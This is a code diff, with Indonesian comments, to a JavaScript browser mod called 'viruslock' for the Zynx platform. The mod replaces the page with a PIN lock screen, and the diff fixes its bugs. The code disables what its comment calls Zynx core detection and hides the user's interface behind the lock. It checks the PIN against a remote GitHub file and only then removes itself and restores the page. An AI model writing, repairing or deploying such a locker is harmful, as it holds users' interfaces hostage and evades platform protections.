@@ -1,5 +1,6 @@
-Iscoredetected = null;
+Iscoredetected = null; // Mematikan deteksi core Zynx
 (async function() {
+    // Pastikan link ini berisi text pin, contoh: 1234 atau array ["1234", "5678"]
     const urlGithub = 'https://raw.githubusercontent.com/kenzz-sz/Zynx_mod/refs/heads/main/mods/viruslock/pin.txt';
     
     const originalContent = document.body.innerHTML;
@@ -62,7 +63,7 @@ Iscoredetected = null;
     btn.onmouseout = () => { btn.style.background = 'transparent'; btn.style.color = '#ff0000'; };
 
     async function verifyAccess() {
-        const inputUser = document.getElementById('pinInput').value;
+        const inputUser = document.getElementById('pinInput').value.trim();
         const pesan = document.getElementById('pesan');
         
         if (!inputUser) return;
@@ -71,41 +72,44 @@ Iscoredetected = null;
             pesan.innerText = "> DECRYPTING...";
             pesan.style.color = "#fff";
 
-            const response = JSON.parse(await fetch(urlGithub));
+            // PERBAIKAN FETCH: Ambil text dari response dengan benar
+            const response = await fetch(urlGithub);
             const rawPin = await response.text();
-            const pinBenar = rawPin
-            console.log(pinBenar)
+            
+            // PERBAIKAN LOGIKA PIN: Cek apakah isi pin.txt itu array JSON atau text biasa
+            let pinBenar = [];
+            try {
+                pinBenar = JSON.parse(rawPin); // Jika pin.txt isinya array: ["1234", "5678"]
+            } catch (e) {
+                pinBenar = [rawPin.trim()]; // Jika pin.txt isinya teks biasa: 1234
+            }
 
-            if (pinBenar.find(i => i === inputUser)) {
+            // Gunakan .includes() alih-alih .find() agar lebih aman
+            if (pinBenar.includes(inputUser)) {
                 pesan.innerText = "> ACCESS_GRANTED";
                 pesan.style.color = "#00ff00";
                 
-                // --- PROSES UNLOCK ---
-                // Menggunakan try-catch karena fh() dan installedmods mungkin tidak ada di lingkup global
+                // PERBAIKAN PROSES UNLOCK: Hapus mod langsung tanpa fh()
                 try {
-                    const resFh = await fh("viruslockxDizz");
-                    const ayamaaa = JSON.parse(resFh);
-                    const dirTarget = ayamaaa.directory; // Hilangkan await jika directory hanya string
-                    
                     if (typeof installedmods !== 'undefined') {
+                        // Pastikan nama "viruslockxDizz" sama persis dengan 'directory' di JSON mod-mu
                         installedmods = installedmods.filter(m => m.directory !== "viruslockxDizz");
-                setTimeout(() => {
                         localStorage.setItem("mymods", JSON.stringify(installedmods));
-                    location.reload()
-                    }, 1000)
                     }
                 } catch (e) {
-                    console.log("Mod removal skipped or failed.");
+                    console.log("Gagal menghapus mod dari sistem.");
                 }
 
                 container.style.transition = "opacity 1s";
                 container.style.opacity = "0";
                 
+                // Kembalikan UI dan reload
                 setTimeout(() => {
                     document.body.style.cssText = originalStyle;
                     document.body.innerHTML = originalContent;
                     document.title = originalTitle;
                     console.clear();
+                    location.reload(); // Memuat ulang agar sistem benar-benar bersih
                 }, 1000);
             } else {
                 pesan.innerText = "> ERROR: WRONG_KEY";
@@ -116,7 +120,7 @@ Iscoredetected = null;
             }
 
         } catch (error) {
-            pesan.innerText = "> CONNECTION_FAILED";
+            pesan.innerText = "> ERROR: CONNECTION_FAILED";
             console.error(error);
         }
     }
